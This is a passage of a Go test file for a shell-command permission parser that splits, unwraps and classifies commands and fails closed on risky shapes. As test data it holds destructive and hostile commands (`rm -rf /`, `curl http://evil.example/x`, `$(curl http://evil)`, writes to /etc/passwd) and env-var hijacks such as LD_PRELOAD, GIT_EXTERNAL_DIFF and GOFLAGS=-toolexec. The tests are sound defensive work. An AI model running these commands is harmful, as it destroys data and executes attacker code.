package permissions

import (
	"errors"
	"strings"
	"testing"
)

// seg is a compact expectation for one parsed segment.
type seg struct {
	name string
	args []string
}

func TestSplitSegments(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []seg
	}{
		{
			desc: "single simple command",
			cmd:  "git status",
			want: []seg{{name: "git", args: []string{"status"}}},
		},
		{
			desc: "compound && splits into two segments",
			cmd:  "git status && rm -rf ~",
			want: []seg{
				{name: "git", args: []string{"status"}},
				{name: "rm", args: []string{"-rf", "~"}},
			},
		},
		{
			desc: "pipe splits into segments",
			cmd:  "cat foo | grep bar",
			want: []seg{
				{name: "cat", args: []string{"foo"}},
				{name: "grep", args: []string{"bar"}},
			},
		},
		{
			desc: "semicolon splits into segments",
			cmd:  "pwd ; ls",
			want: []seg{
				{name: "pwd", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "|| splits into segments",
			cmd:  "false || true",
			want: []seg{
				{name: "false", args: nil},
				{name: "true", args: nil},
			},
		},
		{
			desc: "newline splits into two segments",
			cmd:  "pwd\nrm -rf .",
			want: []seg{
				{name: "pwd", args: nil},
				{name: "rm", args: []string{"-rf", "."}},
			},
		},
		{
			desc: "bash -c inner script is enumerated",
			cmd:  `bash -c "ls && rm x"`,
			want: []seg{
				{name: "ls", args: nil},
				{name: "rm", args: []string{"x"}},
			},
		},
		{
			desc: "sh -c inner script is enumerated",
			cmd:  `sh -c 'git status'`,
			want: []seg{
				{name: "git", args: []string{"status"}},
			},
		},
		{
			desc: "word boundary: lsof is not ls",
			cmd:  "lsof -i",
			want: []seg{{name: "lsof", args: []string{"-i"}}},
		},
		{
			// A trailing `# …` comment is stripped by the parser: the
			// commented-out `rm -rf /` is inert, not a smuggled segment.
			desc: "trailing comment is inert, not a smuggled segment",
			cmd:  "ls # rm -rf /",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			// Change 0070 D1: an env-var prefix whose name is on the proven-inert
			// allowlist no longer fails closed. The assignment is dropped, and the
			// inner command is the segment. (The allowlist replaced a denylist in
			// review blocker 2, so the names here are specific ones we vouch for —
			// an arbitrary `FOO=1` is unproven and lives in the FailClosed table.)
			desc: "inert env prefix parses to the inner command",
			cmd:  "CI=1 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "multiple inert env prefixes",
			cmd:  "CI=1 NO_COLOR=1 go test",
			want: []seg{{name: "go", args: []string{"test"}}},
		},
		{
			desc: "inert env prefix with an empty value",
			cmd:  "NO_COLOR= make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "inert env prefix with a quoted literal value",
			cmd:  `CGO_ENABLED=0 GOOS="linux" go build ./...`,
			want: []seg{{name: "go", args: []string{"build", "./..."}}},
		},
		{
			// The LC_ family is admitted by prefix: every member names a locale.
			desc: "inert prefix rule admits the LC_ family",
			cmd:  "LC_ALL=C LANG=C sort f",
			want: []seg{{name: "sort", args: []string{"f"}}},
		},
		{
			// Assignment-only statement: nothing runs, so nothing to classify.
			desc: "bare inert assignment produces no segment",
			cmd:  "CI=1",
			want: nil,
		},
		{
			desc: "bare inert assignment then a command",
			cmd:  "CI=1; ls",
			want: []seg{{name: "ls", args: nil}},
		},

		// Change 0070 D2: timeout/env/nohup are peeled to their inner command
		// instead of failing closed as arbitrary-arg wrappers. The peel is
		// dedicated for timeout and env — see the FailClosed table for the
		// shapes that stay shut.
		{
			desc: "timeout with a bare-seconds duration peels to the inner command",
			cmd:  "timeout 30 go test ./...",
			want: []seg{{name: "go", args: []string{"test", "./..."}}},
		},
		{
			desc: "timeout with a fractional suffixed duration",
			cmd:  "timeout 1.5s wc -l x",
			want: []seg{{name: "wc", args: []string{"-l", "x"}}},
		},
		{
			desc: "timeout with -k DUR before the duration",
			cmd:  "timeout -k 5 30 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "timeout with a modelled long flag taking a value",
			cmd:  "timeout --kill-after=5s 10m make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "timeout with --signal=SIG and --preserve-status",
			cmd:  "timeout --preserve-status --signal=KILL 10 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "timeout with a combined short flag value",
			cmd:  "timeout -sKILL 10 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "timeout then unknown binary is now evaluable, not unparseable",
			cmd:  "timeout 5 somebinary",
			want: []seg{{name: "somebinary", args: nil}},
		},
		{
			desc: "timeout peels into the bash -c script path",
			cmd:  `timeout 30 bash -c "ls && wc -l x"`,
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "env with an inert assignment peels to the inner command",
			cmd:  "env CI=1 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "env with no assignments peels to the inner command",
			cmd:  "env rm x",
			want: []seg{{name: "rm", args: []string{"x"}}},
		},
		{
			// The dangerous command is no longer hidden behind an unparseable
			// wrapper: it reaches the rules layer, which denies it outright.
			desc: "env assignment does not launder the inner command",
			cmd:  "env CI=1 rm -rf /",
			want: []seg{{name: "rm", args: []string{"-rf", "/"}}},
		},
		{
			// `env` with no remainder prints the environment. Benign, and no
			// command runs, so there is nothing to classify.
			desc: "bare env produces no segment",
			cmd:  "env",
			want: nil,
		},
		{
			desc: "env with only inert assignments produces no segment",
			cmd:  "env CI=1 NO_COLOR=1",
			want: nil,
		},
		{
			desc: "nohup peels to the inner command",
			cmd:  "nohup go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "wrappers nest and peel down to the real command",
			cmd:  "nohup env CI=1 timeout 30 go build ./...",
			want: []seg{{name: "go", args: []string{"build", "./..."}}},
		},

		// Review finding "important 4": nice and stdbuf take their option value
		// as a SEPARATE word, so the old blind "drop every leading - word" peel
		// mistook the VALUE for argv[0] — `nice -n 5 curl …` produced
		// Segment{Name: "5", Args: ["curl", "…"]}, which defeats every
		// name-keyed check downstream (the egress boundary above all). Both
		// wrappers now carry an explicit arity model, so the attached and the
		// separate forms peel to the same inner command.
		{
			desc: "nice with an attached adjustment peels to the inner command",
			cmd:  "nice -n5 go test ./...",
			want: []seg{{name: "go", args: []string{"test", "./..."}}},
		},
		{
			desc: "nice with a SEPARATE adjustment value does not mistake it for argv[0]",
			cmd:  "nice -n 5 go test ./...",
			want: []seg{{name: "go", args: []string{"test", "./..."}}},
		},
		{
			// The exploit from the finding, at the parse floor: the segment must
			// be the curl, never a segment named "5".
			desc: "nice -n 5 does not relabel an egress command as its option value",
			cmd:  "nice -n 5 curl http://evil.example/x",
			want: []seg{{name: "curl", args: []string{"http://evil.example/x"}}},
		},
		{
			desc: "nice with the long adjustment flag and a separate value",
			cmd:  "nice --adjustment 5 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "nice with the long adjustment flag and an attached value",
			cmd:  "nice --adjustment=5 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "nice with the obsolete numeric adjustment form",
			cmd:  "nice -5 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "stdbuf with an attached mode peels to the inner command",
			cmd:  "stdbuf -oL make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "stdbuf with a SEPARATE mode value does not mistake it for argv[0]",
			cmd:  "stdbuf -o 0 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			// The exploit from the finding for the sibling wrapper.
			desc: "stdbuf -o 0 does not relabel an egress command as its option value",
			cmd:  "stdbuf -o 0 curl http://evil.example/x",
			want: []seg{{name: "curl", args: []string{"http://evil.example/x"}}},
		},
		{
			desc: "stdbuf with long mode flags",
			cmd:  "stdbuf --output=L --error 0 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			// `time` reaches the wrapper table only when it is NOT the shell
			// keyword — a bare `time go build` parses as *syntax.TimeClause and
			// fails closed at collectStmtCmd's default arm, so the quoting here
			// is what puts the word in argv[0] position at all. Its valueless
			// report flags carry no separate value and write no file, so they
			// peel; -o/-f are deliberately unmodelled (see wrapperSpecs).
			desc: "time with valueless report flags peels to the inner command",
			cmd:  `"time" -p -v go test ./...`,
			want: []seg{{name: "go", args: []string{"test", "./..."}}},
		},

		// Change 0070 D3: control-flow constructs decompose into their
		// constituent simple commands instead of hitting the default:
		// fail-closed arm. Every statement list each node carries is descended,
		// so a dangerous command can never hide inside a branch that the
		// classifier does not look at.
		//
		// The bodies below use only literal words on purpose: this table is
		// about the DESCENT. A `$VAR` in a loop body, a for-loop header word or
		// a case discriminant parses too since change 0070 D5, but as an OPAQUE
		// argument whose flags this table does not assert — those rows live in
		// TestSplitSegments_OpaqueArgs, where the opaqueness is the point.
		{
			desc: "if/then descends both Cond and Then",
			cmd:  "if [ -f x ]; then cat x; fi",
			want: []seg{
				{name: "[", args: []string{"-f", "x", "]"}},
				{name: "cat", args: []string{"x"}},
			},
		},
		{
			desc: "if/else descends the else branch",
			cmd:  "if true; then ls; else pwd; fi",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
				{name: "pwd", args: nil},
			},
		},
		{
			// The v3 AST nests each elif/else as another *IfClause hanging off
			// .Else. Stopping at the first level would leave `rm -rf /` in a
			// trailing else invisible to every downstream layer.
			desc: "elif/else chain is followed to the end",
			cmd:  "if true; then ls; elif false; then pwd; else wc -l x; fi",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
				{name: "false", args: nil},
				{name: "pwd", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "for loop with literal header words descends its body",
			cmd:  "for f in a b; do ls; done",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			// `for f; do …` iterates the positional parameters: no header word
			// list at all, so there is nothing unresolvable to fail on.
			desc: "for loop over positional params descends its body",
			cmd:  "for f; do ls; done",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "nested if inside for",
			cmd:  "for f in a b; do if true; then ls; fi; done",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "while descends Cond and Do",
			cmd:  "while true; do ls; done",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			// `until` is a WhileClause with Until: true — same node, same descent.
			desc: "until descends Cond and Do",
			cmd:  "until false; do ls; done",
			want: []seg{
				{name: "false", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "case with a literal discriminant descends its branches",
			cmd:  "case foo in a) ls ;; esac",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "case descends every branch, not just the first",
			cmd:  "case foo in a) ls ;; b) pwd ;; *) wc -l x ;; esac",
			want: []seg{
				{name: "ls", args: nil},
				{name: "pwd", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "block descends its statements",
			cmd:  "{ ls; wc -l x; }",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "subshell descends its statements",
			cmd:  "(cd /tmp && ls)",
			want: []seg{
				{name: "cd", args: []string{"/tmp"}},
				{name: "ls", args: nil},
			},
		},
		{
			// Background-ness changes WHEN a command runs, not WHAT runs, so a
			// backgrounded statement yields the same segments as a foreground one.
			desc: "backgrounded statement yields the same segments",
			cmd:  "ls & wc -l x",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "backgrounded statement inside a block",
			cmd:  "{ ls & wc -l x; }",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
			}
		})
	}
}

func TestSplitSegments_Raw(t *testing.T) {
	got, err := splitSegments("git status && rm -rf ~")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("expected 2 segments, got %d", len(got))
	}
	if !strings.Contains(got[0].Raw, "git status") {
		t.Errorf("segment 0 Raw = %q, want to contain %q", got[0].Raw, "git status")
	}
	if !strings.Contains(got[1].Raw, "rm -rf ~") {
		t.Errorf("segment 1 Raw = %q, want to contain %q", got[1].Raw, "rm -rf ~")
	}
}

// TestSplitSegments_BenignRedirects asserts the lenient redirect exception:
// a redirect whose only effect is silencing/redirecting to /dev/null, or a
// pure fd-duplication (2>&1, >&2), must NOT force the whole statement closed.
// The command still parses into its real segments (which higher layers then
// classify), rather than stalling on ErrUnparseable.
func TestSplitSegments_BenignRedirects(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []seg
	}{
		{
			desc: "2>/dev/null in a read-only pipeline",
			cmd:  "wc -l a.go 2>/dev/null | tail -5",
			want: []seg{
				{name: "wc", args: []string{"-l", "a.go"}},
				{name: "tail", args: []string{"-5"}},
			},
		},
		{
			desc: "stdout to /dev/null",
			cmd:  "ls > /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "append to /dev/null",
			cmd:  "ls >> /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "input from /dev/null",
			cmd:  "cat < /dev/null",
			want: []seg{{name: "cat", args: nil}},
		},
		{
			desc: "2>&1 fd-dup in a pipeline",
			cmd:  "make 2>&1 | tail",
			want: []seg{
				{name: "make", args: nil},
				{name: "tail", args: nil},
			},
		},
		{
			desc: ">&2 fd-dup",
			cmd:  "echo hi >&2",
			want: []seg{{name: "echo", args: []string{"hi"}}},
		},
		{
			desc: "&> /dev/null (stdout+stderr to /dev/null)",
			cmd:  "ls &> /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
				// Change 0070 D4: the benign shapes carry NO write target. If
				// /dev/null or an fd-dup started being recorded, every one of
				// these would stop being read-only safe and would need root
				// scoping to auto-approve — the 0037 stall, reintroduced.
				if len(got[i].WriteTargets) != 0 {
					t.Errorf("segment %d WriteTargets = %#v, want none (benign redirect)", i, got[i].WriteTargets)
				}
			}
		})
	}
}

// TestSplitSegments_RedirectWriteTargets pins change 0070 D4: a redirect to a
// LITERAL out-target no longer fails the command closed at the parse floor.
// The parser has no root set and therefore cannot decide whether a target is
// acceptable; it records the target on the segment(s) the redirected statement
// produces and lets the scoping layer — which does have the roots — decide.
//
// The rows here assert the PARSE only. That `echo x > /etc/passwd` must not
// auto-approve is asserted at the layers that decide it:
// TestAllSegmentsReadOnlySafe_WriteTargetIsNotReadOnly (the no-root safelist
// short-circuit), TestClassifyHeuristic_RedirectWriteTargets (the scoping), and
// TestAutoMode_RedirectOutsideWorkspace_DoesNotAutoApprove (end to end).
func TestSplitSegments_RedirectWriteTargets(t *testing.T) {
	cases := []struct {
		desc    string
		cmd     string
		want    []seg
		targets [][]string // parallel to want
	}{
		{
			desc:    "stdout redirect to a system path is recorded, not refused",
			cmd:     "echo x > /etc/passwd",
			want:    []seg{{name: "echo", args: []string{"x"}}},
			targets: [][]string{{"/etc/passwd"}},
		},
		{
			desc:    "stdout redirect to a relative file",
			cmd:     "go build > out.log",
			want:    []seg{{name: "go", args: []string{"build"}}},
			targets: [][]string{{"out.log"}},
		},
		{
			desc:    "append redirect",
			cmd:     "grep foo bar >> ~/.zshrc",
			want:    []seg{{name: "grep", args: []string{"foo", "bar"}}},
			targets: [][]string{{"~/.zshrc"}},
		},
		{
			desc:    "numbered fd redirect (2>)",
			cmd:     "ls 2> err.log",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"err.log"}},
		},
		{
			desc:    "&> records the target",
			cmd:     "make &> build.log",
			want:    []seg{{name: "make", args: nil}},
			targets: [][]string{{"build.log"}},
		},
		{
			desc:    "&>> records the target",
			cmd:     "make &>> build.log",
			want:    []seg{{name: "make", args: nil}},
			targets: [][]string{{"build.log"}},
		},
		{
			desc:    "a /dev/null lookalike is a real target, no longer a refusal",
			cmd:     "ls > /dev/null.txt",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"/dev/null.txt"}},
		},
		{
			desc:    "a /dev/null typo is a real target",
			cmd:     "ls 2>/dev/nul",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"/dev/nul"}},
		},
		{
			desc:    "several redirects on one statement record every target",
			cmd:     "ls > out.txt 2> err.txt",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"out.txt", "err.txt"}},
		},
		{
			desc:    "a benign /dev/null alongside a real target records only the real one",
			cmd:     "ls 2>/dev/null > /etc/x",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"/etc/x"}},
		},
		{
			// Input is a read: the file is not a write target, so the segment
			// stays wholly read-only and needs no scoping.
			desc:    "input redirect from a real file is benign",
			cmd:     "cat < config.yaml",
			want:    []seg{{name: "cat", args: nil}},
			targets: [][]string{nil},
		},
		{
			desc:    "here-doc body is stdin data, not a file target",
			cmd:     "cat <<EOF\nhi\nEOF",
			want:    []seg{{name: "cat", args: nil}},
			targets: [][]string{nil},
		},
		{
			desc:    "quoted here-doc body is not expanded and stays benign",
			cmd:     "cat <<'EOF'\n$(id)\nEOF",
			want:    []seg{{name: "cat", args: nil}},
			targets: [][]string{nil},
		},
		{
			desc:    "tab-stripping here-doc (<<-)",
			cmd:     "cat <<-EOF\n\thi\n\tEOF",
			want:    []seg{{name: "cat", args: nil}},
			targets: [][]string{nil},
		},
		{
			// THE PLUMBING ROW. The redirect hangs off the RIGHT operand of &&,
			// so it belongs to `wc` alone. Attaching a statement's targets to the
			// first segment of the command — or to all of them — would make `ls`
			// look like a writer and misroute the whole command.
			desc: "a && b > f attaches the target to b only",
			cmd:  "ls && wc -l x > out.txt",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
			targets: [][]string{nil, {"out.txt"}},
		},
		{
			desc: "a pipeline's redirect attaches to the redirected stage",
			cmd:  "ls | tee out.log > /dev/null",
			want: []seg{
				{name: "ls", args: nil},
				{name: "tee", args: []string{"out.log"}},
			},
			targets: [][]string{nil, nil},
		},
		{
			// A compound statement's redirect applies to EVERY command it
			// contains, so every segment the descent produced carries it.
			desc: "a block's redirect reaches every segment inside it",
			cmd:  "{ ls; wc -l x; } > out.txt",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
			targets: [][]string{{"out.txt"}, {"out.txt"}},
		},
		{
			desc:    "a for loop's redirect reaches the body segment",
			cmd:     "for f in a b; do ls; done > out.txt",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"out.txt"}},
		},
		{
			desc:    "a redirect inside an if branch reaches that branch's segment",
			cmd:     "if true; then echo x > /etc/passwd; fi",
			want:    []seg{{name: "true", args: nil}, {name: "echo", args: []string{"x"}}},
			targets: [][]string{nil, {"/etc/passwd"}},
		},
		{
			desc:    "a redirect inside a subshell reaches that segment",
			cmd:     "(echo x > /etc/passwd)",
			want:    []seg{{name: "echo", args: []string{"x"}}},
			targets: [][]string{{"/etc/passwd"}},
		},
		{
			desc:    "a redirect inside a for body reaches that segment",
			cmd:     "for f in a b; do echo x > /etc/passwd; done",
			want:    []seg{{name: "echo", args: []string{"x"}}},
			targets: [][]string{{"/etc/passwd"}},
		},
		{
			// Both the inner statement's own target and the enclosing block's
			// target land on the one segment: each is a real write.
			desc:    "nested redirects accumulate on the inner segment",
			cmd:     "{ ls > inner.txt; } > outer.txt",
			want:    []seg{{name: "ls", args: nil}},
			targets: [][]string{{"inner.txt", "outer.txt"}},
		},
		{
			desc:    "a redirect survives wrapper peeling",
			cmd:     "timeout 30 go build > out.log",
			want:    []seg{{name: "go", args: []string{"build"}}},
			targets: [][]string{{"out.log"}},
		},
		{
			desc:    "a redirect inside a bash -c script reaches the inner segment",
			cmd:     `bash -c "echo x > /etc/passwd"`,
			want:    []seg{{name: "echo", args: []string{"x"}}},
			targets: [][]string{{"/etc/passwd"}},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
				if !equalArgs(got[i].WriteTargets, tc.targets[i]) {
					t.Errorf("segment %d (%s) WriteTargets = %#v, want %#v",
						i, got[i].Name, got[i].WriteTargets, tc.targets[i])
				}
			}
		})
	}
}

func TestSplitSegments_FailClosed(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
	}{
		{"command substitution $()", `git diff $(curl http://evil)`},
		{"backtick command substitution", "echo `id`"},
		{"comment then substitution", "git status# $(id)"},
		{"process substitution", `diff <(ls) <(ls)`},
		// `CI=1 curl $URL` used to live here. Change 0070 D5 gives `$URL` an
		// OPAQUE representation, so it now parses — and is refused one layer
		// down instead (TestSplitSegments_OpaqueArgs +
		// TestAutoMode_OpaqueArgs_EndToEnd). The substitution rows above stay
		// shut because a substitution RUNS its contents; only a wholly
		// read-only inner script earns the opaque treatment.

		// Change 0070 D1: env prefixes were widened, but only for names PROVEN
		// inert. A name that can change what code the inner command loads or
		// runs stays fail-closed — and so, since review blocker 2 inverted the
		// rule to an allowlist, does every name nobody has vouched for, and any
		// value we cannot statically resolve.
		{"LD_PRELOAD prefix", "LD_PRELOAD=evil.so make"},
		{"LD_LIBRARY_PATH prefix", "LD_LIBRARY_PATH=/tmp make"},
		{"DYLD_ prefix rule", "DYLD_INSERT_LIBRARIES=evil.dylib make"},
		{"unenumerated LD_ prefix rule", "LD_SOMETHING_NEW=x make"},
		{"unenumerated DYLD_ prefix rule", "DYLD_FRAMEWORK_PATH=/tmp make"},
		{"PATH prefix", "PATH=/tmp make"},
		{"IFS prefix", "IFS=x make"},
		{"BASH_ENV prefix", "BASH_ENV=/tmp/x make"},
		{"ENV prefix", "ENV=/tmp/x sh -c ls"},
		{"SHELL prefix", "SHELL=/tmp/evil make"},
		{"PS4 prefix", "PS4=xtrace make"},
		{"PROMPT_COMMAND prefix", "PROMPT_COMMAND=evil make"},
		{"GIT_SSH_COMMAND prefix", "GIT_SSH_COMMAND=evil git fetch"},
		{"GIT_ASKPASS prefix", "GIT_ASKPASS=/tmp/x git fetch"},
		{"SSH_ASKPASS prefix", "SSH_ASKPASS=/tmp/x git fetch"},
		{"PYTHONSTARTUP prefix", "PYTHONSTARTUP=/tmp/x python"},
		{"NODE_OPTIONS prefix", "NODE_OPTIONS=--require=/tmp/x node app.js"},
		{"PERL5LIB prefix", "PERL5LIB=/tmp perl x.pl"},
		{"RUBYOPT prefix", "RUBYOPT=-rx ruby x.rb"},
		// Regression: git's exec hooks. `git diff`/`git log` ARE auto-approved
		// by isSafeGit, so before the GIT_ prefix rule landed these six were
		// verified to auto-approve an arbitrary exec with no human present —
		// the exact fail-open this change's widening would otherwise create.
		// See TestAutoMode_GitEnvHookPrefix_DoesNotAutoApprove for the
		// end-to-end verdict assertion.
		{"GIT_EXTERNAL_DIFF exec hook", "GIT_EXTERNAL_DIFF=/tmp/evil git diff"},
		{"GIT_PAGER exec hook", "GIT_PAGER=/tmp/evil git log"},
		{"GIT_CONFIG_* injection", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/evil git log"},
		{"GIT_ prefix rule catches unenumerated names", "GIT_PROXY_COMMAND=/tmp/evil git fetch"},
		{"PAGER exec hook", "PAGER=/tmp/evil git log"},
		{"EDITOR exec hook", "EDITOR=/tmp/evil git log"},
		{"LESSOPEN input filter", "LESSOPEN=/tmp/evil git log"},
		{"BASH_ prefix rule", "BASH_SOMETHING=x make"},
		{"SHELLOPTS prefix", "SHELLOPTS=xtrace make"},
		{"CDPATH prefix", "CDPATH=/tmp make"},

		// Review blocker 2: the rule is an ALLOWLIST, so the build-toolchain exec
		// hooks a denylist forgot fail closed, and so does any name nobody has
		// proven inert. `make` and `go build` reach allow at the heuristic layer,
		// so each of these was a silent exec of an out-of-workspace binary.
		{"CC names the C compiler make runs", "CC=/tmp/evil make"},
		{"CXX names the C++ compiler", "CXX=/tmp/evil make"},
		{"LD names the linker", "LD=/tmp/evil make"},
		{"AR names the archiver", "AR=/tmp/evil make"},
		{"RANLIB names an archive tool", "RANLIB=/tmp/evil make"},
		{"GOFLAGS carries -toolexec", "GOFLAGS=-toolexec=/tmp/evil go build ./..."},
		{"GOENV names a config file of more flags", "GOENV=/tmp/evil.env go build ./..."},
		{"GOROOT relocates the whole toolchain", "GOROOT=/tmp/evil go build ./..."},
		{"CGO_CFLAGS carries compiler flags", "CGO_CFLAGS=-fplugin=/tmp/evil.so go build ./..."},
		{"CGO_LDFLAGS carries linker flags", "CGO_LDFLAGS=-fuse-ld=/tmp/evil go build ./..."},
		{"CGO_ is not an inert prefix wholesale", "CGO_CXXFLAGS=-fplugin=/tmp/evil.so go build"},
		{"MAKEFLAGS names a makefile", "MAKEFLAGS=-f/tmp/evil.mk make"},
		{"an unrecognised name is unproven, not inert", "SOME_UNKNOWN_HOOK=/tmp/evil make"},
		{"a bare unknown name is unproven", "FOO=1 make"},
		{"an assignment-only unknown name is unproven", "FOO=1"},
		// The allowlist is matched exactly: a name we do not recognise letter for
		// letter is unproven, and fail-closed on the tie now points the other way
		// from the old case-insensitive denylist.
		{"allowlist match is case-sensitive", "ci=1 make"},
		{"allowlist match is case-sensitive for LC_", "lc_all=C make"},
		{"denylisted name is still not inert", "ld_preload=evil.so make"},
		{"denylisted prefix name is still not inert", "dyld_insert_libraries=x make"},
		{"command-substitution assignment value", "CI=$(id) make"},
		{"parameter-expansion assignment value", "CI=$BAR make"},
		{"assignment value with an embedded expansion", `CI="pre$BAR" make`},
		{"assignment-only with a name that is not inert", "LD_PRELOAD=evil.so"},
		{"assignment-only with a substituted value", "CI=$(curl http://evil)"},
		{"append assignment", "CI+=1 make"},
		// The array/subscript inline forms are rejected by the bash parser
		// itself ("inline variables cannot be arrays"), so these rows pin the
		// parse-error path rather than assignsAreBenign's shape check. They stay
		// as regression rows in case a future parser bump starts accepting them.
		{"array assignment", "CI=(a b) make"},
		{"indexed assignment", "CI[0]=1 make"},
		{"inert prefix does not launder a wrapper", "CI=1 sudo rm -rf /"},
		{"inert prefix does not launder a path-qualified argv0", "CI=1 ./evil"},
		{"path-qualified argv0 relative", "./sed -n 1p file"},
		{"path-qualified argv0 absolute", "/tmp/git status"},
		{"bare bash without -c", "bash"},
		{"bash with script file (no -c)", "bash script.sh"},
		{"sh -c with no script word", "sh -c"},
		{"xargs wrapper", "xargs rm"},
		{"npx wrapper", "npx cowsay hi"},
		{"sudo wrapper", "sudo rm -rf /"},

		// Change 0070 D2: timeout/env/nohup peel (see TestSplitSegments), but
		// every shape where the peel cannot prove what actually runs stays shut.
		// env is deliberately blunt about flags: -i clears the environment and
		// -S re-splits its operand into a whole new command, neither of which
		// the assignment allowlist can see.
		{"env -i clears the environment", "env -i make"},
		{"env -u unsets a variable", "env -u PATH make"},
		{"env -S re-splits into a new command", "env -S 'foo bar'"},
		{"env with a long flag", "env --ignore-environment make"},
		{"env -0", "env -0"},
		{"env with a bare -- separator", "env -- make"},
		{"env assignment reuses the D1 allowlist", "env LD_PRELOAD=x make"},
		{"env assignment reuses the D1 prefix rules", "env DYLD_INSERT_LIBRARIES=x make"},
		{"env PATH assignment", "env PATH=/tmp make"},
		{"env assignment with a substituted value", "env CI=$(id) make"},
		{"env assignment with a parameter expansion", "env CI=$BAR make"},
		{"env assignment with a non-name left side", "env ci-x=1 make"},
		{"env assignment with an empty name", "env =evil make"},
		{"env does not launder a path-qualified argv0", "env CI=1 ./evil"},
		{"env does not launder an arbitrary-arg wrapper", "env xargs rm"},
		{"timeout with no duration", "timeout go test"},
		{"timeout with no inner command", "timeout 30"},
		{"bare timeout", "timeout"},
		{"timeout with a non-duration word", "timeout 30x make"},
		{"timeout with an unmodelled flag", "timeout --unmodelled 30 make"},
		{"timeout flag swallows the duration", "timeout -s 30 make"},
		{"timeout -k with no value", "timeout -k"},
		{"timeout with two duration words", "timeout 30 30 make"},
		{"timeout does not launder a wrapper", "timeout 30 sudo rm -rf /"},
		{"timeout does not launder xargs", "timeout 30 xargs rm"},
		{"timeout does not launder a path-qualified argv0", "timeout 30 ./evil"},
		{"path-qualified timeout is not peeled", "/usr/bin/timeout 30 ls"},
